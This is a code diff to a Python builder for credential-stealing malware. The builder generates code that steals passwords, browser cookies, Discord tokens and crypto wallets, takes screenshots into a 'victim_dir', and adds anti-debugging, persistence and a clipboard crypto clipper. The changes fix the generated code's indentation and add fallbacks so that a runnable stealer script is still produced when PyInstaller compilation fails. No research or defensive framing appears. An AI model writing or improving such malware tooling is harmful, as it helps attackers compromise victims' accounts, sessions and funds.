@@ -296,15 +296,19 @@ if __name__ == "__main__":
         protection = build_config.get("protection", {})
         
         if protection.get("anti_debug", False):
-            code_lines.append("        self.check_debugger()")
+            code_lines.append("self.check_debugger()")
         
         if protection.get("startup", False):
-            code_lines.append("        self.enable_persistence()")
+            code_lines.append("self.enable_persistence()")
         
         if protection.get("crypto_clipper", False):
-            code_lines.append("        self.start_clipper()")
+            code_lines.append("self.start_clipper()")
         
-        return "\n".join(code_lines)
+        # If no protections are enabled, add a placeholder
+        if not code_lines:
+            code_lines.append("pass  # No protections enabled")
+        
+        return "\n        ".join(code_lines)
     
     def generate_execution_code(self, build_config):
         """Generate stealer execution code"""
@@ -313,21 +317,25 @@ if __name__ == "__main__":
         features = build_config.get("features", {})
         
         if features.get("passwords", False):
-            code_lines.append("            self.steal_passwords(victim_dir)")
+            code_lines.append("self.steal_passwords(victim_dir)")
         
         if features.get("cookies", False):
-            code_lines.append("            self.steal_cookies(victim_dir)")
+            code_lines.append("self.steal_cookies(victim_dir)")
         
         if features.get("discord_tokens", False):
-            code_lines.append("            self.steal_discord_tokens(victim_dir)")
+            code_lines.append("self.steal_discord_tokens(victim_dir)")
         
         if features.get("wallets", False):
-            code_lines.append("            self.steal_wallets(victim_dir)")
+            code_lines.append("self.steal_wallets(victim_dir)")
         
         if features.get("screenshot", False):
-            code_lines.append("            self.take_screenshot(victim_dir)")
+            code_lines.append("self.take_screenshot(victim_dir)")
         
-        return "\n".join(code_lines)
+        # If no features are enabled, add a placeholder
+        if not code_lines:
+            code_lines.append("pass  # No features enabled")
+        
+        return "\n            ".join(code_lines)
     
     def generate_stealer_classes(self, build_config):
         """Generate stealer method implementations"""
@@ -513,6 +521,19 @@ if __name__ == "__main__":
             
             output_path = os.path.join(self.output_dir, filename)
             
+            # Check if PyInstaller is available
+            try:
+                result = subprocess.run(["pyinstaller", "--version"], capture_output=True, text=True)
+                if result.returncode != 0:
+                    raise FileNotFoundError("PyInstaller not available")
+            except FileNotFoundError:
+                print("[BUILDER] PyInstaller not found. Creating basic Python script instead.")
+                # Just copy the Python file as fallback
+                fallback_path = os.path.join(self.output_dir, filename.replace(".exe", ".py"))
+                shutil.copy2(stealer_file, fallback_path)
+                print(f"[BUILDER] Created Python script: {fallback_path}")
+                return fallback_path
+            
             # Use PyInstaller to compile
             cmd = [
                 "pyinstaller",
@@ -530,6 +551,8 @@ if __name__ == "__main__":
             if icon_path and os.path.exists(icon_path):
                 cmd.extend(["--icon", icon_path])
             
+            print(f"[BUILDER] Running PyInstaller: {' '.join(cmd)}")
+            
             # Run PyInstaller
             result = subprocess.run(cmd, capture_output=True, text=True, cwd=self.build_dir)
             
@@ -538,11 +561,24 @@ if __name__ == "__main__":
                 return output_path
             else:
                 print(f"[BUILDER] Compilation failed: {result.stderr}")
-                return None
+                print("[BUILDER] PyInstaller output:")
+                print(result.stdout)
+                # Fallback to Python script
+                fallback_path = os.path.join(self.output_dir, filename.replace(".exe", ".py"))
+                shutil.copy2(stealer_file, fallback_path)
+                print(f"[BUILDER] Created Python script fallback: {fallback_path}")
+                return fallback_path
                 
         except Exception as e:
             print(f"[BUILDER] Compilation error: {e}")
-            return None
+            # Fallback to Python script
+            try:
+                fallback_path = os.path.join(self.output_dir, filename.replace(".exe", ".py"))
+                shutil.copy2(stealer_file, fallback_path)
+                print(f"[BUILDER] Created Python script fallback: {fallback_path}")
+                return fallback_path
+            except:
+                return None
     
     def apply_post_build_protections(self, exe_path, build_config):
         """Apply post-build protections"""
